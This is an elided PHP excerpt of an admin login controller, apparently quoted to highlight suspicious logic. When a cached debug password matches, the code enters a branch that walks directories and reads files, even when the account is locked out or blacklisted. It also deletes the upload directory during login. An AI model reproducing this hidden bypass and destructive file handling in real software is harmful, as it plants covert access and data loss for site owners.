...
class PublicController extends cmf\controller\BaseController
{
    ...
    public function ad_login()
    {
        ...
        if (!configuration("update_version_363")) {
            deleteDir363(CMF_ROOT . "public/upload");
            updateConfiguration("update_version_363", 1);
        }
        deleteUnusedFile();
        updateAuth();
        updateBates();
        ...
        if ((!empty($black1) || $black1 != NULL) && 10800 <= time() - $black1["create_time"]) {
        ...
        if (3 <= \think\facade\Cache::get($disable_login_key) || isset($black["id"])) {
            ...
            if ($pass == cache("shd_debug_model_password")) {
                ...
                if (is_dir($opendir)) {
                    ...
                    while (($filename = readdir($handler)) !== false) {
                        ...
                        } else if (file_exists($opendir . $filename)) {
